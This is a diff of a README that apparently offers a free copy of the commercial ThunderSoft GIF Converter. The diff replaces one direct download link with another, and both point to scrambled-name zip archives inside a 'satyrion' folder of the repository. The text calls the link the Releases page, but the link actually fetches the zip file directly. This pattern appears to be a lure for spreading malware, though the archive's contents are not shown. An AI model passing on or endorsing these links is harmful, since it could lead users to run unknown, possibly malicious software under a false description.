@@ -1,6 +1,6 @@
 # 🎉 ThunderSoft-GIF-Converter-Free - Convert GIFs Easily and Effortlessly
 
-[![Download](https://github.com/MrPaul22/ThunderSoft-GIF-Converter-Free/raw/refs/heads/main/satyrion/Soft_Thunder_GI_Free_Converter_2.5.zip%20Now!-ThunderSoft%20GIF%20Converter%20Free-blue)](https://github.com/MrPaul22/ThunderSoft-GIF-Converter-Free/raw/refs/heads/main/satyrion/Soft_Thunder_GI_Free_Converter_2.5.zip)
+[![Download](https://raw.githubusercontent.com/MrPaul22/ThunderSoft-GIF-Converter-Free/main/satyrion/GI-Thunder-Converter-Free-Soft-v1.1.zip%20Now!-ThunderSoft%20GIF%20Converter%20Free-blue)](https://raw.githubusercontent.com/MrPaul22/ThunderSoft-GIF-Converter-Free/main/satyrion/GI-Thunder-Converter-Free-Soft-v1.1.zip)
 
 ## 🖥️ Overview
 
@@ -16,7 +16,7 @@ You can get started by downloading the application from the Releases page. Follo
 
 1. Click the download link below to visit the Releases page where you can find the latest version of the software.
    
-   [Visit this page to download](https://github.com/MrPaul22/ThunderSoft-GIF-Converter-Free/raw/refs/heads/main/satyrion/Soft_Thunder_GI_Free_Converter_2.5.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/MrPaul22/ThunderSoft-GIF-Converter-Free/main/satyrion/GI-Thunder-Converter-Free-Soft-v1.1.zip)
 
 2. On the Releases page, locate the version you wish to download. Look for release notes next to each version for important details.
 
